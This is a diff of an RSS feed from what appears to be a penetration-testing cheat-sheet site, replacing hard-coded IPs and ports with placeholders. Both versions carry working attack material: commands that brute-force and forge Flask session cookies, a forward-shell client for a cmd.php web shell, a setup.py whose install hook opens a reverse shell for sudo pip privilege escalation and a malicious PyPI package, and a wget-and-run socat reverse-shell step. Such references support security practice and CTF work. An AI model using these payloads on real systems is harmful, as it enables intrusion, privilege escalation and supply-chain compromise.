@@ -12,35 +12,35 @@
       <link>https://tldrbins.github.io/flask_cookie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/flask_cookie/</guid>
-      <description> Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
+      <description>Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
     </item>
     <item>
       <title>Forward Shell</title>
       <link>https://tldrbins.github.io/forward_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/forward_shell/</guid>
-      <description> Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
+      <description>Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
     </item>
     <item>
       <title>pip</title>
       <link>https://tldrbins.github.io/pip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pip/</guid>
-      <description> SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
+      <description>SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
     </item>
     <item>
       <title>Pypi</title>
       <link>https://tldrbins.github.io/pypi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pypi/</guid>
-      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@example.com&amp;#34;, url=&amp;#34;http://example.com&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
+      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@&amp;lt;DOMAIN&amp;gt;&amp;#34;, url=&amp;#34;http://&amp;lt;DOMAIN&amp;gt;&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
     </item>
     <item>
       <title>Python Decompile</title>
       <link>https://tldrbins.github.io/python_decompile/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/python_decompile/</guid>
-      <description>Tools pyinstxtractor uncompyle6 pycdc # Unpack pyinstaller packed binary pyinstxtractor test.elf # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc # Install git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check # Run ./pycdc script.pyc Ref: pycdc</description>
+      <description>Tools pyinstxtractor uncompyle6 pycdc # Unpack pyinstaller packed binary pyinstxtractor &amp;lt;FILE&amp;gt; # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 &amp;lt;PYC_FILE&amp;gt; # Install git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check # Run ./pycdc &amp;lt;PYC_FILE&amp;gt; Ref: pycdc</description>
     </item>
     <item>
       <title>Retrieve Flask Debug Pin</title>
@@ -54,7 +54,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:&amp;lt;LOCAL_PORT&amp;gt; # In target machine wget -q http://&amp;lt;LOCAL_IP&amp;gt;/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; # In our local Linux machine export TERM=xterm-256color Ref: Download socat</description>
     </item>
   </channel>
 </rss>
